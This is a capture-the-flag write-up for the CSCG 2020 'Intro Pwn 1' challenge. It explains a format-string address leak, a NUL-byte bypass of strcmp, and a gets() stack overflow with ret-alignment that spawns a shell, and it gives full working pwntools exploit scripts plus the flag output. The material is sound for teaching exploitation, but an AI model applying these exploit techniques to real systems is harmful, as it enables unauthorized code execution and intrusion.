# Intro Pwn 1
This was one of the pwnable challenges of the CSCG 2020.
We're given a binary and its source code to work with.

There are 3 important Functions defined in the source :
```c
void welcome() {
    char read_buf[0xff];
    printf("Enter your witch name:\n")
    gets(read_buf);
    printf("┌───────────────────────┐\n");
    printf("│ You are a Hufflepuff! │\n");
    printf("└───────────────────────┘\n");
    printf(read_buf);
}
```

```c
void AAAAAAAA() {
    char read_buf[0xff];

    printf(" enter your magic spell:\n");
    gets(read_buf);
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
    } else {
        printf("-10 Points for Hufflepuff!\n");
        _exit(0);
    }
}
```

```c
void WINgardium_leviosa() {
    printf("┌───────────────────────┐\n");
    printf("│ You are a Slytherin.. │\n");
    printf("└───────────────────────┘\n");
    system("/bin/sh");
}
```
The first two are called by main and the third function is our goal, because
it executes `system("/bin/sh")` which gives us a shell to cat the flag with.
(also the capitalised WIN in the name gives you a clue).

____
## Exploitation ideas

First of all I ran `checksec` on it to know whether or not we deal with a aslr binary...

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   80 Symbols     No       0               2       pwn1
```
... and we sure do.

Then I looked at the functions :
* `welcome` calls `gets` which is always a bad sign, but it did not seem to be exploitable at this time, because we don't know the adress of `WINgardium_leviosa`
* `welcome` also called `printf` with our input, which lets us leak (or even write to) values on the stack through a format string exploit.
* `AAAAAAAA` also calls `gets` but compares the output of it and only returns if we enter the right input

(`gets` can give us control over the instruction pointer, by inputting more, that the buffer bounds,
  which will overwrite the stack, and if we write enough, will overwrite the return pointer, which will
  be poped and jumped to if we return. The `exit` function doesn't return, which causes the current
  function to also not return, and thus not pop our value. So we have to avoid a call to that function if
  we want to exploit this)

## Exploitation
So the first exploitable thing is the format string. We dont have any address we can write to yet, so the
only thing we can do is leak. We somehow need to get the address of `WINgardium_leviosa`. A way how we
can do this is by somehow leaking some address pointing to code (a return value or something like that)
and then adding the needed offset to get to the `WINgardium_leviosa` function.

So the path is clear. I first ran the binary in gdb and inputted a standard leaking format string
`%p|%p|%p|%p|...|%p` as the name.
As a result I got :
```bash
Enter your witch name:
%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%
p|%p|%p|%p|%p|%p|%p|%p|%p|
┌───────────────────────┐
│ You are a Hufflepuff! │
└───────────────────────┘
0x7ffff7f60583|(nil)|0x7ffff7e90567|0x4c|(nil)|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x
70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c702
57c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c7
0257c70257c70|0x70257c70257c7025|0x7f007c70257c|(nil)|(nil)|(nil)|(nil)|(nil)|0x7ffff7fcf218|(nil)|0x20000
00000|(nil)|(nil)|0x7fff00000000|(nil)|0x24c9464ad16a3200|(nil)|0x5555555549e9|0x7fffffffdd80|0x555555554b
21|0x7fffffffde78|0x100000000|(nil)|0x7ffff7dc7023|0x71| enter your magic spell:

```
The code section is `0x555555554000  -  0x555555555000`. So in our leak we are looking for adresses
matching that range. The first address we find matching the range is `0x555555554b21` (being the 39th
leak)
With gdb I looked what this address was and found out that this is probably the return address of the
current function.
```
pwndbg> x/10i 0x555555554b21 - 5
   0x555555554b1c <main+40>:    call   0x555555554a23 <welcome>
   0x555555554b21 <main+45>:    mov    eax,0x0
   0x555555554b26 <main+50>:    call   0x555555554a89 <AAAAAAAA>
```
We now need to calculate the offset of the `WINgardium_leviosa` function to our leak.
```
pwndbg> p WINgardium_leviosa
$1 = {<text variable, no debug info>} 0x5555555549ec <WINgardium_leviosa>
```

```python
>>> hex(0x5555555549ec - 0x555555554b21)
'-0x135'
```

The next exploitable vulnerability, is the `gets` call in the `AAAAAAAA` function. But to get to the
return we need to get around the check of the input.
The `strcmp` function compares two NULL terminated C strings.
The `gets` function reads input until we send a newline character. This newline character is then
replaced by a NULL byte.
So the bug here is, that we can send a NULL byte without `gets` stopping the reading. `strcmp` then
ignores everything after this NULL byte, as it thinks, that the string is terminated here. So we can send
input longer than the `Expelliarmus` string by starting the string with `Expelliarmus\0`.
From this point on I used a python script using [pwntools](https://pypi.org/project/pwntools/).
```python
from pwn import *

p = process("./pwn1")
p.sendline("|".join(["%p"]*70)) # Format string exploit

p.readline() # reading the Hufflepuff banner
p.readline()
p.readline()
p.readline()

leaks = p.readline().decode("utf-8").split("|") # read the leaked values
print(leaks)
leak_addr = int(leaks[38],16) # get the leaked return address
print(hex(leak_addr))

win = leak_addr - 0x135 # calculate the address of WINgardium_leviosa
print(hex(win))

input() # stop the script until we press enter to attach gdb
p.sendline(b"Expelliarmus\0" + cyclic(400))

p.interactive()
```
If we run this script (with `gdb` attached), we can see, that the script crashes, because it wants to
return to `0x7ffefcb33bf8` (`cnaa` as a string). We can now locate that string in our input and place the
address of `WINgardium_leviosa` there to call it when trying to return.

```python
...

win = leak_addr - 0x135 # calculate the address of WINgardium_leviosa
print(hex(win))

input() # stop the script until we press enter to attach gdb
p.sendline(b"Expelliarmus\0" + b"A" * cyclic_find(b"cnaa") + p64(win))

p.interactive()
```
This script works localy and you get a shell, but if you try to exploit the server with that you get a
EOF before the shell is spawned. This most probably means, that the remote process crashed. This can
sometimes happen, when the stack is not properly aligned. To fix this we need to pop one (or more) values
from the stack. And this can be done, by simply adding the address of a ret instruction in front of the
win address. This will execute this ret instruction and pop the next value (the win address) to jump to,
with the stack having one element less.

For the ret instruction I used the one at the end of `AAAAAAAA` and calculated the offset to our leak
(-0x2e) and ajusted the script :
```python
from pwn import *

p = remote("hax1.allesctf.net",9100) # connect to the challenge sever

p.sendline("|".join(["%p"]*70)) # Format string exploit

p.readline() # reading the Hufflepuff banner
p.readline()
p.readline()
p.readline()

leaks = p.readline().decode("utf-8").split("|") # read the leaked values

leak_addr = int(leaks[38],16) # get the leaked return address

ret = leak_addr - 0x2e # calculate the address of an ret instruction

win = leak_addr - 0x135 # calculate the address of WINgardium_leviosa

p.sendline(b"Expelliarmus\0" + b"A" * cyclic_find(b"cnaa") + p64(ret) + p64(win))

p.interactive()
```

```bash
$ python pwnit.py
[+] Opening connection to hax1.allesctf.net on port 9100: Done
[*] Switching to interactive mode
~ Protego!
┌───────────────────────┐
│ You are a Slytherin.. │
└───────────────────────┘
$ cat flag
CSCG{NOW_PRACTICE_MORE}
```
